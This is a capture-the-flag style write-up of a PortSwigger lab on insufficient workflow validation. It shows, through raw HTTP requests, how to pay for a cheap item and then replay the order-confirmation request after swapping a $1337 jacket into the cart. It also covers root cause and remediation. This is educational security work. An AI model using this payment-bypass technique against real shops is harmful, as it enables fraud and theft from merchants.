# PortSwigger Lab: Insufficient workflow validation

# TAGS: Business Logic, Workflow Bypass, E-commerce, Burp Suite

Category: Business Logic
Date: October 27, 2026
Day: Tuesday
Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation
Published: Ready
Status: Done

---

## Intro

This lab is part of the Business Logic series. The flaw is that the application doesn't validate the **sequence of events** in the purchasing workflow. After a successful checkout, the order confirmation endpoint stays reachable, and it confirms whatever is in the cart at that moment — even if the cart has since been changed to include an item the store credit can't cover.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says the application makes flawed assumptions about the sequence of events in the purchasing workflow. The goal is to buy the **Lightweight l33t leather jacket** ($1337.00). The lab provides the credentials **wiener:peter**.

I logged in and checked my account:

```http
GET /my-account?id=wiener HTTP/2
Host: 0a44006a0336262480b3fd21005200ee.web-security-academy.net
Cookie: session=<SESSION>
```

The store credit was **$100.00** — not nearly enough for the jacket.

The workflow is the usual e-commerce one:

1. Add an item to the cart (`POST /cart`).
2. Go to `/cart` and click "Place order" (`POST /cart/checkout`).
3. On success, the application redirects to `/cart/order-confirmation?order-confirmed=true`.

The key observation is that the confirmation page is a **separate, directly reachable endpoint**.

---

## Exploitation:

#### Step 1: Buy an item that I can afford

First I needed a successful checkout, so I added a cheap item to the cart:

```http
POST /cart HTTP/2
Host: 0a44006a0336262480b3fd21005200ee.web-security-academy.net
Cookie: session=y2xQy3HlB52pGXwkWGYA56zHqCPWmQsA
Content-Type: application/x-www-form-urlencoded

productId=9&redir=PRODUCT&quantity=1
```

Then I placed the order:

```http
POST /cart/checkout HTTP/2
Host: 0a44006a0336262480b3fd21005200ee.web-security-academy.net
Cookie: session=y2xQy3HlB52pGXwkWGYA56zHqCPWmQsA
Content-Type: application/x-www-form-urlencoded

csrf=64cUSg8PFJS7ZjN1HXjsah2OOfcQiiUv
```

The response was a redirect to the confirmation page:

```http
HTTP/2 303 See Other
Location: /cart/order-confirmation?order-confirmed=true
```

Following it showed **"Your order is on its way!"** with the cheap item.

#### Step 2: Capture the confirmation request

I sent the confirmation request to **Burp Repeater**:

```http
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0a44006a0336262480b3fd21005200ee.web-security-academy.net
Cookie: session=y2xQy3HlB52pGXwkWGYA56zHqCPWmQsA
```

At this point it returned the order details for the cheap item.

#### Step 3: Swap the cart and replay the confirmation

I went back to the store, opened the jacket (`productId=1`) and added it to the cart:

```http
POST /cart HTTP/2
Host: 0a44006a0336262480b3fd21005200ee.web-security-academy.net
Cookie: session=y2xQy3HlB52pGXwkWGYA56zHqCPWmQsA
Content-Type: application/x-www-form-urlencoded

productId=1&redir=PRODUCT&quantity=1
```

The cart now held a **$1337.00** item — far above the store credit — but I didn't check out again. I just **resent the confirmation request in Repeater**:

```http
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0a44006a0336262480b3fd21005200ee.web-security-academy.net
Cookie: session=y2xQy3HlB52pGXwkWGYA56zHqCPWmQsA
```

The application confirmed the order with the leather jacket in the cart, **without deducting the cost** from the store credit. The lab showed **"Congratulations, you solved the lab!"**.

---

## Root Cause

The application treats the order confirmation as a simple page that can be requested at any time after a checkout, instead of tying it to the **specific order that was paid for**. The confirmation endpoint only knows that *a* checkout happened earlier in the session; it does not re-validate that the current cart matches the paid order or that the total was actually charged.

Because the cart can be modified between the checkout and the confirmation, an attacker can pay for a cheap item, swap in an expensive one, and replay the confirmation request.

---

## Impact

An attacker can complete orders for expensive items without paying — direct revenue loss and inventory/accounting inconsistencies. In a real store, the same flaw could be abused at scale to obtain products for free, and similar workflow-bypass patterns can affect refunds, coupon application, and shipping steps.

---

## Remediation

To prevent this issue, applications should:

- Bind the confirmation step to a **specific server-side order** (an order ID created and paid for at checkout), never to the live cart;
- Re-validate the cart, the total and the payment status at confirmation time;
- Make the workflow state **one-time and short-lived** — invalidate it after the confirmation is consumed;
- Never trust client-supplied workflow parameters (`order-confirmed=true`) as proof that a step was completed;
- Enforce the correct sequence of steps server-side, so a later step cannot be reached or replayed out of order.

---

## Key Takeaways

1. Workflow steps must be validated **server-side, in order** — a reachable "final" page is not a completed workflow.
2. The confirmation must reference the paid order, not the current cart.
3. Replaying a confirmation request after swapping the cart bypasses payment.
4. The trick was to buy a cheap item first (to reach a valid confirmation state), then swap in the jacket and resend.

---

## References

- [PortSwigger — Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [PortSwigger — Insufficient workflow validation (lab)](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)
- [OWASP — Business Logic Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
